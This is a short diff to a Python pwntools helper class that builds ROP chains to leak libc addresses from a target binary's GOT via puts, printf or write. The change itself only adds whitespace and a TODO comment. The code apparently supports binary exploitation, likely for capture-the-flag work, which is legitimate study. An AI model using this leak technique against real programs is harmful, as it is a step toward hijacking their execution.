@@ -79,13 +79,14 @@ class Leak():
                 log.failure("Could not get leak, no main method found (please specify with -m)")
                 exit(0)
         leak_funcs = ['puts','printf','system','write']
-        for leak_func in leak_funcs:
+        for leak_func in leak_funcs:            
             if leak_func in self.binary.got.keys():
                 log.info('Using '+leak_func)                            
                 rop = ROP(self.binary)
                 if leak_func == 'printf':
                     rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func],"%s"])
                 elif leak_func == 'write':
+                    # Todo: bruteforce fd or give an option to set it
                     rop.write(0x4, self.binary.got['write'], 0x8)
                 else:
                     rop.call(self.binary.plt[leak_func], [self.binary.got[leak_func]])
